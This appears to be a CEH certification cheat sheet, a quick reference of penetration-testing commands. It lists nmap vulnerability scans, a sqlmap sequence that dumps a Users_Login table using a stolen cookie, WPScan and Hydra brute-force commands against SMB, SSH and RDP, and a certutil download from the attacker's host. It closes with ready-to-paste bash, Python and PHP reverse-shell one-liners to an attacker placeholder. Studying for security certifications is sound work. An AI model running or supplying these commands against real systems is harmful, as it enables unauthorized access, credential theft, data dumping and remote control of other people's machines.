# CEH Cheat Sheet


---

## 📂 File Transfer & Sharing (Windows ↔ Linux)
> **Common for both:** `python3 -m http.server 8080`

| Direction | Command |
| :--- | :--- |
| **Windows Download** | `certutil.exe -Urlcache -f http://<ParrotIP>/eg.jpg C:\temp\eg.jpg` |
| **Linux Download** | `wget http://<Windows_IP>:8080/eg.jpg -O eg.jpg` |

---

## 🔍 File Discovery & Infrastructure
### Linux Search
* **By Extension:** `sudo find / -name *.txt`
* **Specific File:** `sudo find / -name SpecificFileName.txt`
* **Current Path:** `sudo find . -name SpecificFileName.txt`
* **Visual Tree:** `tree` (Works on Windows & Linux)

### Infrastructure Recon
* **Server Identity:** `nmap -A -oN scans` (Use `mousepad` for easy search)
* **Domain Controller (DC):** Check for **Port 88 (Kerberos)** and **Port 389 (LDAP)**.
* **Vulnerability Research:** `nmap -Pn --script vuln <TIP> -T5`
* **Directory Bruting:** `dirb <targetDomain> -x eg.txt`

---

## ☣️ Malware Analysis & Forensics

### Static Analysis Tools
* **objdump:** Display information from object files.
  * `objdump -d <file>` (Disassemble executable sections)
  * `objdump -x <file>` (Display all available header information)
* **readpe:** Part of `pe-utils`, used to analyze Windows PE files.
  * `readpe --all <file.exe>` (Full analysis of headers, sections, and imports)
* **nm:** List symbols from object files.
  * `nm -u <file>` (Display only undefined symbols/external calls)
* **Entry Point/Linker:** `PEiD` or `PE Explorer`.
* **Entropy/Packed Detection:** 
  * Windows: `DIE` (Detect It Easy)
  * Linux: `ent <file>`
* **Hashing:** `HashMyFiles.exe` (Windows) or `sha256sum <file>` (Linux).

---

## 🕸️ Web & SQL Injection
### SQLmap Workflow
1. **Get Cookie:** Execute `document.cookie` in browser console.
2. **List DBs:** `sqlmap -u <url> --cookie "<value>" --dbs`
3. **List Tables:** `sqlmap -u <url> --cookie "<value>" -D dbName --tables`
4. **Dump Data:** `sqlmap -u <url> --cookie "<value>" -D dbName -T Users_Login --dump`

### WordPress (WPScan)
* **Basic Scan:** `wpscan -url <target>`
* **Brute Force:** `wpscan -url <URL> -U user -P pass.txt`
* **Enumerate Users:** `wpscan -url <URL> -e u`

---

## 🦈 Network Traffic Analysis (Wireshark)
* **DoS/SYN Detection:** `tcp.flags.syn == 1 && tcp.flags.ack == 0`
* **High Volume Check:** `Statistics` -> `Conversations` (Check for no reply packets).
* **Frame Search:** `frame contains "string"`
* **Expert Info:** `Analyze` -> `Expert Info`
* **IoT/MQTT:** Use `mqtt` filter to inspect publish/subscribe messages.

---

## 🔑 Cracking & Remote Access
### Brute Force (Hydra)
* **SMB:** `hydra -L users.txt -P pass.txt <TIP> smb -f`
* **SSH (Custom Port):** `hydra -L users.txt -P passwords.txt -s 2222 ssh://<TIP> -f`
* **RDP:** `hydra -L users.txt -P passwords.txt rdp://<TIP> -f`

### Remote Tools
* **SMB Shares:** `smbmap -H <TIP>` or `smbclient -L <TIP>`
* **RDP Login:** `xfreerdp /v:<TIP> /u:username` or **Remmina**.
* **PrivEsc:** Reference [GTFOBins](https://gtfobins.github.io/).

---

## 🐚 Reverse Shell One-Liners (Quick Reference)
* **Bash:** `bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1`
* **Python:** `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<LHOST>",<LPORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'`
* **PHP:** `php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'`

---
